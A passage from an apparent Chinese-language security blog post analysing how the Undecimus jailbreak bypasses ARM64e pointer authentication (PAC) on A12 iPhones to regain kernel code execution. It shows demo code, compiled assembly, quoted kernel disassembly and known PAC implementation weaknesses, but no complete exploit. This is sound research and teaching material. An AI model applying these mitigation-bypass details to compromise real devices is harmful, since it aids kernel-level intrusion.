<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content="Jailbreak,Assembly,Security"><meta name="author" content="高级页面仔 (Soulghost)"><meta name="copyright" content="高级页面仔 (Soulghost)"><title>iOS Internals and Exploits | iOS Security Cabin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://avatars0.githubusercontent.com/u/6300263?s=460&amp;u=c55866a279854c9150528b358802a75be5e6a507&amp;v=4"></div><div class="author-info__name text-center">高级页面仔 (Soulghost)</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">8</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">15</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">iOS Security Cabin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">iOS Security Cabin</div><div id="site-sub-title">iOS Internals and Exploits</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/11/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89%E7%BB%95%E8%BF%87-A12-%E7%9A%84-PAC-%E5%AE%9E%E7%8E%B0-kexec/">Undecimus 分析（四）绕过 A12 的 PAC 实现 kexec</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-11</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/JailBreak/">JailBreak</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Undecimus/">Undecimus</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/KEXEC/">KEXEC</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/PAC/">PAC</a></span><div class="content"><h1 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h1><ol>
<li><a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dd918d051882573180a2ba7" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</a></li>
<li><a href="https://juejin.im/post/5de37a236fb9a071b5615dea" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（三）IOSurface Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dec7f2f6fb9a0160c411516" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（四）The tfp0 !</a></li>
<li><a href="https://juejin.im/post/5df5f6416fb9a016402d1cc0" target="_blank" rel="noopener">iOS Jailbreak Principles - Undecimus 分析（一）Escape from Sandbox</a></li>
<li><a href="https://juejin.im/post/5e087dbd51882549757e5be2" target="_blank" rel="noopener">iOS Jailbreak Principles - Undecimus 分析（二）通过 String XREF 定位内核数据</a></li>
<li><a href="https://juejin.im/post/5e1ac76d51882520c02c82c0" target="_blank" rel="noopener">iOS Jailbreak Principles - Undecimus 分析（三）通过 IOTrap 实现内核任意代码执行</a></li>
</ol>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 <a href="https://juejin.im/post/5e1ac76d51882520c02c82c0" target="_blank" rel="noopener">上一篇文章</a> 中我们介绍了非 arm64e 下通过 IOTrap 实现 kexec 的过程。阻碍 arm64e 实现这一过程的主要因素是 PAC (Pointer Authentication Code) 缓解措施，在这一篇文章中我们将介绍 Undecimus 中绕过 PAC 机制的过程。</p>
<p>整个绕过过程十分复杂，本文的主要参考资料为 <a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html" target="_blank" rel="noopener">Examining Pointer Authentication on the iPhone XS</a> 和 Undecimus 中与 arm64e 相关的 PAC Bypass 代码。</p>
<h1 id="PAC-的一些特点"><a href="#PAC-的一些特点" class="headerlink" title="PAC 的一些特点"></a>PAC 的一些特点</h1><p>什么是 PAC 这里不再赘述，简言之就是一种对返回地址、全局指针等的一种签名与验签保护机制，详细定义和机制读者可以自行查阅资料，这里仅给出一个简单的例子来帮助理解 PAC 实现。</p>
<p>下面这段代码中包含了一个全局数值变量、一个基于函数指针 fptr 的动态函数调用，猜一下哪些值会被 PAC 保护呢？</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pac.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_somedata = <span class="number">102</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tram_one</span><span class="params">(<span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"call tramp one %d\n"</span>, t);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">step_ptr</span><span class="params">(<span class="keyword">void</span> *ptr)</span> </span>&#123;</span><br><span class="line">    *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span> **&gt;(ptr) = (<span class="keyword">void</span> *)&amp;tram_one;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    g_somedata += argc;</span><br><span class="line">    <span class="keyword">void</span> *fptr = <span class="literal">NULL</span>;</span><br><span class="line">    step_ptr(fptr);</span><br><span class="line">    (<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">int</span> (*)(<span class="keyword">int</span>)&gt;(fptr))(g_somedata);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面我们用 clang 将 cpp 编译链接并生成 arm64e 下的汇编代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -S -arch arm64e -isysroot `xcrun --sdk iphoneos --show-sdk-path` -fno-asynchronous-unwind-tables pac.cpp -o pace.s</span><br></pre></td></tr></table></figure>

<p>生成的完整汇编结果为：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">	<span class="meta">.section</span>	__TEXT,__text,regular,pure_instructions</span><br><span class="line">	.<span class="keyword">build_version </span>ios, <span class="number">13</span>, <span class="number">0</span>	sdk_version <span class="number">13</span>, <span class="number">0</span></span><br><span class="line">	.globl	__Z8tram_onei           <span class="comment">; -- Begin function _Z8tram_onei</span></span><br><span class="line">	.p2align	<span class="number">2</span></span><br><span class="line"><span class="symbol">__Z8tram_onei</span>:                          <span class="comment">; @_Z8tram_onei</span></span><br><span class="line">	.cfi_startproc</span><br><span class="line"><span class="comment">; %bb.0:</span></span><br><span class="line">	pacibsp</span><br><span class="line">	<span class="keyword">sub	</span><span class="built_in">sp</span>, <span class="built_in">sp</span>, <span class="number">#32</span>             <span class="comment">; =32</span></span><br><span class="line">	stp	x29, x30, [<span class="built_in">sp</span>, <span class="number">#16</span>]     <span class="comment">; 16-byte Folded Spill</span></span><br><span class="line">	<span class="keyword">add	</span>x29, <span class="built_in">sp</span>, <span class="number">#16</span>            <span class="comment">; =16</span></span><br><span class="line">	.cfi_def_cfa w29, <span class="number">16</span></span><br><span class="line">	.cfi_offset w30, -<span class="number">8</span></span><br><span class="line">	.cfi_offset w29, -<span class="number">16</span></span><br><span class="line">	stur	w0, [x29, #-<span class="number">4</span>]</span><br><span class="line">	ldur	w0, [x29, #-<span class="number">4</span>]</span><br><span class="line">                                        <span class="comment">; implicit-def: $x1</span></span><br><span class="line">	<span class="keyword">mov	</span>x1, x0</span><br><span class="line">	<span class="keyword">mov	</span>x8, <span class="built_in">sp</span></span><br><span class="line">	<span class="keyword">str	</span>x1, [x8]</span><br><span class="line">	<span class="keyword">adrp	</span>x0, l_.<span class="keyword">str@PAGE</span></span><br><span class="line"><span class="keyword">	</span><span class="keyword">add	</span>x0, x0, l_.<span class="keyword">str@PAGEOFF</span></span><br><span class="line"><span class="keyword">	</span><span class="keyword">bl	</span>_printf</span><br><span class="line">	<span class="keyword">mov	</span>w9, <span class="number">#0</span></span><br><span class="line">	<span class="keyword">str	</span>w0, [<span class="built_in">sp</span>, <span class="number">#8</span>]            <span class="comment">; 4-byte Folded Spill</span></span><br><span class="line">	<span class="keyword">mov	</span>x0, x9</span><br><span class="line">	ldp	x29, x30, [<span class="built_in">sp</span>, <span class="number">#16</span>]     <span class="comment">; 16-byte Folded Reload</span></span><br><span class="line">	<span class="keyword">add	</span><span class="built_in">sp</span>, <span class="built_in">sp</span>, <span class="number">#32</span>             <span class="comment">; =32</span></span><br><span class="line">	retab</span><br><span class="line">	.cfi_endproc</span><br><span class="line">                                        <span class="comment">; -- End function</span></span><br><span class="line">	.globl	__Z8step_ptrPv          <span class="comment">; -- Begin function _Z8step_ptrPv</span></span><br><span class="line">	.p2align	<span class="number">2</span></span><br><span class="line"><span class="symbol">__Z8step_ptrPv</span>:                         <span class="comment">; @_Z8step_ptrPv</span></span><br><span class="line"><span class="comment">; %bb.0:</span></span><br><span class="line">	<span class="keyword">sub	</span><span class="built_in">sp</span>, <span class="built_in">sp</span>, <span class="number">#16</span>             <span class="comment">; =16</span></span><br><span class="line">	<span class="keyword">adrp	</span>x8, l__Z8tram_onei$auth_ptr$ia<span class="number">$0</span><span class="comment">@PAGE</span></span><br><span class="line">	<span class="keyword">ldr	</span>x8, [x8, l__Z8tram_onei$auth_ptr$ia<span class="number">$0</span><span class="comment">@PAGEOFF]</span></span><br><span class="line">	<span class="keyword">str	</span>x0, [<span class="built_in">sp</span>, <span class="number">#8</span>]</span><br><span class="line">	<span class="keyword">ldr	</span>x0, [<span class="built_in">sp</span>, <span class="number">#8</span>]</span><br><span class="line">	<span class="keyword">str	</span>x8, [x0]</span><br><span class="line">	<span class="keyword">add	</span><span class="built_in">sp</span>, <span class="built_in">sp</span>, <span class="number">#16</span>             <span class="comment">; =16</span></span><br><span class="line">	ret</span><br><span class="line">                                        <span class="comment">; -- End function</span></span><br><span class="line">	.globl	_main                   <span class="comment">; -- Begin function main</span></span><br><span class="line">	.p2align	<span class="number">2</span></span><br><span class="line"><span class="symbol">_main</span>:                                  <span class="comment">; @main</span></span><br><span class="line">	.cfi_startproc</span><br><span class="line"><span class="comment">; %bb.0:</span></span><br><span class="line">	pacibsp</span><br><span class="line">	<span class="keyword">sub	</span><span class="built_in">sp</span>, <span class="built_in">sp</span>, <span class="number">#64</span>             <span class="comment">; =64</span></span><br><span class="line">	stp	x29, x30, [<span class="built_in">sp</span>, <span class="number">#48</span>]     <span class="comment">; 16-byte Folded Spill</span></span><br><span class="line">	<span class="keyword">add	</span>x29, <span class="built_in">sp</span>, <span class="number">#48</span>            <span class="comment">; =48</span></span><br><span class="line">	.cfi_def_cfa w29, <span class="number">16</span></span><br><span class="line">	.cfi_offset w30, -<span class="number">8</span></span><br><span class="line">	.cfi_offset w29, -<span class="number">16</span></span><br><span class="line">	<span class="keyword">adrp	</span>x8, _g_somedata<span class="comment">@PAGE</span></span><br><span class="line">	<span class="keyword">add	</span>x8, x8, _g_somedata<span class="comment">@PAGEOFF</span></span><br><span class="line">	stur	wzr, [x29, #-<span class="number">4</span>]</span><br><span class="line">	stur	w0, [x29, #-<span class="number">8</span>]</span><br><span class="line">	stur	x1, [x29, #-<span class="number">16</span>]</span><br><span class="line">	ldur	w0, [x29, #-<span class="number">8</span>]</span><br><span class="line">	<span class="keyword">ldr	</span>w9, [x8]</span><br><span class="line">	<span class="keyword">add	</span>w9, w9, w0</span><br><span class="line">	<span class="keyword">str	</span>w9, [x8]</span><br><span class="line">	<span class="keyword">mov	</span>x8, <span class="number">#0</span></span><br><span class="line">	<span class="keyword">str	</span>x8, [<span class="built_in">sp</span>, <span class="number">#24</span>]</span><br><span class="line">	<span class="keyword">ldr	</span>x0, [<span class="built_in">sp</span>, <span class="number">#24</span>]</span><br><span class="line">	<span class="keyword">bl	</span>__Z8step_ptrPv</span><br><span class="line">	<span class="keyword">adrp	</span>x8, _g_somedata<span class="comment">@PAGE</span></span><br><span class="line">	<span class="keyword">add	</span>x8, x8, _g_somedata<span class="comment">@PAGEOFF</span></span><br><span class="line">	<span class="keyword">ldr	</span>x0, [<span class="built_in">sp</span>, <span class="number">#24</span>]</span><br><span class="line">	<span class="keyword">ldr	</span>w9, [x8]</span><br><span class="line">	<span class="keyword">str	</span>x0, [<span class="built_in">sp</span>, <span class="number">#16</span>]           <span class="comment">; 8-byte Folded Spill</span></span><br><span class="line">	<span class="keyword">mov	</span>x0, x9</span><br><span class="line">	<span class="keyword">ldr	</span>x8, [<span class="built_in">sp</span>, <span class="number">#16</span>]           <span class="comment">; 8-byte Folded Reload</span></span><br><span class="line">	<span class="keyword">blraaz	</span>x8</span><br><span class="line">	<span class="keyword">mov	</span>w9, <span class="number">#0</span></span><br><span class="line">	<span class="keyword">str	</span>w0, [<span class="built_in">sp</span>, <span class="number">#12</span>]           <span class="comment">; 4-byte Folded Spill</span></span><br><span class="line">	<span class="keyword">mov	</span>x0, x9</span><br><span class="line">	ldp	x29, x30, [<span class="built_in">sp</span>, <span class="number">#48</span>]     <span class="comment">; 16-byte Folded Reload</span></span><br><span class="line">	<span class="keyword">add	</span><span class="built_in">sp</span>, <span class="built_in">sp</span>, <span class="number">#64</span>             <span class="comment">; =64</span></span><br><span class="line">	retab</span><br><span class="line">	.cfi_endproc</span><br><span class="line">                                        <span class="comment">; -- End function</span></span><br><span class="line">	<span class="meta">.section</span>	__<span class="meta">DATA</span>,__<span class="meta">data</span></span><br><span class="line">	.globl	_g_somedata             <span class="comment">; @g_somedata</span></span><br><span class="line">	.p2align	<span class="number">2</span></span><br><span class="line"><span class="symbol">_g_somedata</span>:</span><br><span class="line">	<span class="meta">.long</span>	<span class="number">102</span>                     <span class="comment">; 0x66</span></span><br><span class="line"></span><br><span class="line">	<span class="meta">.section</span>	__TEXT,__cstring,cstring_literals</span><br><span class="line"><span class="symbol">l_.str</span>:                                 <span class="comment">; @.str</span></span><br><span class="line">	<span class="meta">.asciz</span>	<span class="string">"call tramp one %d\n"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="meta">.section</span>	__<span class="meta">DATA</span>,__auth_ptr</span><br><span class="line">	.p2align	<span class="number">3</span></span><br><span class="line"><span class="symbol">l__Z8tram_onei$auth_ptr$ia$0</span>:</span><br><span class="line">	.quad	__Z8tram_onei<span class="comment">@AUTH(ia,0)</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.subsections_via_symbols</span></span><br></pre></td></tr></table></figure>

<h2 id="返回地址保护"><a href="#返回地址保护" class="headerlink" title="返回地址保护"></a>返回地址保护</h2><p>这里有几个值得注意的地方，第一个是每个嵌套了调用的函数的开头和结尾处都被插入了 PAC 指令：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">__Z8tram_onei</span>:</span><br><span class="line">    pacibsp</span><br><span class="line">    <span class="comment">; ...</span></span><br><span class="line">    retab</span><br></pre></td></tr></table></figure>
<p>这里 PAC 用 Instruction Key B 保护了函数的返回地址，有效防止了 JOP 攻击。</p>
<p>再看一下全局变量的声明和访问：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	<span class="meta">.section</span>	__<span class="meta">DATA</span>,__<span class="meta">data</span></span><br><span class="line">	.globl	_g_somedata             <span class="comment">; @g_somedata</span></span><br><span class="line">	.p2align	<span class="number">2</span></span><br><span class="line"><span class="symbol">_g_somedata</span>:</span><br><span class="line">	<span class="meta">.long</span>	<span class="number">102</span>                     <span class="comment">; 0x66</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">adrp	</span>x8, _g_somedata<span class="comment">@PAGE</span></span><br><span class="line">	<span class="keyword">add	</span>x8, x8, _g_somedata<span class="comment">@PAGEOFF</span></span><br><span class="line">	<span class="keyword">ldr	</span>w9, [x8]</span><br></pre></td></tr></table></figure>
<p>可见常规的数值变量并没有在 PAC 的保护之下。</p>
<h2 id="指针保护"><a href="#指针保护" class="headerlink" title="指针保护"></a>指针保护</h2><p>下面我们来看一下函数指针的赋值与调用：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tram_one</span><span class="params">(<span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"call tramp one %d\n"</span>, t);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">step_ptr</span><span class="params">(<span class="keyword">void</span> *ptr)</span> </span>&#123;</span><br><span class="line">    *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span> **&gt;(ptr) = (<span class="keyword">void</span> *)&amp;tram_one;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">void</span> *fptr = <span class="literal">NULL</span>;</span><br><span class="line">    step_ptr(fptr);</span><br><span class="line">    (<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">int</span> (*)(<span class="keyword">int</span>)&gt;(fptr))(g_somedata);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先可以看到 tram_one 函数地址这一全局符号受到了 PAC 保护：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	<span class="meta">.section</span>	__<span class="meta">DATA</span>,__auth_ptr</span><br><span class="line">	.p2align	<span class="number">3</span></span><br><span class="line"><span class="symbol">l__Z8tram_onei$auth_ptr$ia$0</span>:</span><br><span class="line">	.quad	__Z8tram_onei<span class="comment">@AUTH(ia,0)</span></span><br></pre></td></tr></table></figure>

<p><code>step_ptr</code> 函数中对应的访问代码：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">__Z8step_ptrPv</span>:</span><br><span class="line">    <span class="comment">; ...</span></span><br><span class="line">	<span class="keyword">adrp	</span>x8, l__Z8tram_onei$auth_ptr$ia<span class="number">$0</span><span class="comment">@PAGE</span></span><br><span class="line">	<span class="keyword">ldr	</span>x8, [x8, l__Z8tram_onei$auth_ptr$ia<span class="number">$0</span><span class="comment">@PAGEOFF]</span></span><br><span class="line">	<span class="comment">; ...</span></span><br></pre></td></tr></table></figure>

<p>在执行 <code>(reinterpret_cast&lt;int (*)(int)&gt;(fptr))(g_somedata);</code> 调用时，采用了带 PAC 验证的指令：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">_main</span>: </span><br><span class="line">    <span class="comment">; ...</span></span><br><span class="line">    <span class="comment">; x8 = l__Z8tram_onei$auth_ptr$ia$0</span></span><br><span class="line">    <span class="keyword">blraaz	</span>x8</span><br></pre></td></tr></table></figure>

<h1 id="PAC-对-JOP-的影响"><a href="#PAC-对-JOP-的影响" class="headerlink" title="PAC 对 JOP 的影响"></a>PAC 对 JOP 的影响</h1><p>在上一篇文章中我们实现 kexec 的关键在于劫持一个虚函数，这里所修改的地址有：</p>
<ol>
<li>修改虚函数表的 getTargetAndTrapForIndex 指针指向 Gadget；</li>
<li>构造 IOTrap，其 func 指向要执行的内核函数。</li>
</ol>
<p>不幸的是，这两个地址都受到了 PAC 机制的保护[1]，所以我们之前的 kexec 方法在 arm64e 上就失效了。以下的代码摘自于参考资料[1]：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">loc_FFFFFFF00808FF00</span></span><br><span class="line">    <span class="keyword">STR </span>       XZR, [<span class="built_in">SP</span>,<span class="number">#0x30</span>+var_28]  <span class="comment">;; target = NULL</span></span><br><span class="line">    <span class="keyword">LDR </span>       X8, [X19]               <span class="comment">;; x19 = userClient, x8 = -&gt;vtable</span></span><br><span class="line">    <span class="comment">; 1. vtable is under protection</span></span><br><span class="line">    AUTDZA     X8                      <span class="comment">;; validate vtable's PAC</span></span><br><span class="line">    <span class="comment">; ...</span></span><br><span class="line">    <span class="keyword">MOV </span>       X0, X19                 <span class="comment">;; x0 = userClient</span></span><br><span class="line">    <span class="comment">; 2. vtable-&gt;getTargetAndTrapForIndex is under protection</span></span><br><span class="line">    <span class="keyword">BLRAA </span>     X8, X9                  <span class="comment">;; PAC call -&gt;getTargetAndTrapForIndex</span></span><br><span class="line">    <span class="comment">; ...</span></span><br><span class="line">    <span class="keyword">MOV </span>       X9, <span class="number">#0</span>                  <span class="comment">;; Use context 0 for non-virtual func</span></span><br><span class="line">    <span class="keyword">B </span>         loc_FFFFFFF00808FF70</span><br><span class="line">    <span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_FFFFFFF00808FF70</span></span><br><span class="line">   <span class="comment">; ... not set x9</span></span><br><span class="line">   <span class="comment">; 3. trap-&gt;func is under protection</span></span><br><span class="line">   <span class="keyword">BLRAA </span>     X8, X9                  <span class="comment">;; PAC call func(target, p1, ..., p6)</span></span><br><span class="line">   <span class="comment">; ...</span></span><br></pre></td></tr></table></figure>

<p>由上面的代码可知，在 arm64e 架构的 iOS 12.1.2 内核代码中，虚函数表、虚函数指针和 IOTrap 的函数指针都得到了 PAC 保护。</p>
<p><strong>需要特别注意的是，这里的 trap-&gt;func 调用所使用的 context 寄存器 X9 被写入了 0，即 BLRAA 相当于验签了一个 PACIZA 签名的地址，这是实现第一个受限 kexec 的重要突破口。</strong></p>
<h1 id="绕过-PAC-的理论分析"><a href="#绕过-PAC-的理论分析" class="headerlink" title="绕过 PAC 的理论分析"></a>绕过 PAC 的理论分析</h1><h2 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h2><p>在 参考资料[1] 的 write-up 中很大篇幅讲述了从软件白盒、硬件黑盒的角度对 PAC 进行的分析与绕过尝试，并得到了如下结论：</p>
<ol>
<li>储存 PAC Key 的寄存器只能在 EL1 模式下访问，而用户态处于 EL0，无法直接访问这些系统寄存器；</li>
<li>即使我们能从内核的内存中读取到 PAC Key，如果不能逆向出完整的加解密过程，依然无法伪造签名；</li>
<li>Apple 在 EL0 和 EL1 中使用了不同的 PAC Key，这就打破了 Croess-EL PAC Forgeries；</li>
<li>Apple 在实现 PACIA, PACIB, PACDA 和 PACDB 这些指令时采用了不同的算法，即使全部使用相同的 Key 也会得到不同的结果，这就打破了 Cross-Key Symmetry；</li>
<li>虽然在软件层面看 PAC Key 是 hardcode 的，但事实证明每次启动 PAC Key 都会变化。</li>
</ol>
<p>这 5 条限制每一条都刺痛着尝试绕过 PAC 的人们的心，可见苹果在这一方面做了非常多变态的保护企图将 JOP 彻底解决。此外苹果还在公开的 XNU 代码中删除了与 PAC 相关的细节，并通过控制流混淆等手段阻止黑客在 kernelcache 中轻易找到可用的 Signing Gadgets。</p>
<h2 id="有利条件"><a href="#有利条件" class="headerlink" title="有利条件"></a>有利条件</h2><p>不得不佩服这些内核大佬的功力，即使在如此重重保护下 Brandon Azad 依然找到了 PAC 在实现上的一些软件漏洞：</p>
<ol>
<li>PAC 在进行验签时，如果发现验签失败，它会将 2 位 error code 插入到指针的 62~61 区域，这里是 pointer’s extension bits；</li>
<li>PAC 在执行签名时，如果发现指针的 extension bits 异常，它仍然会插入正确的签名，只是会通过翻转 PAC 的最高位 (第 62 位) 来使指针失效。</li>
</ol>
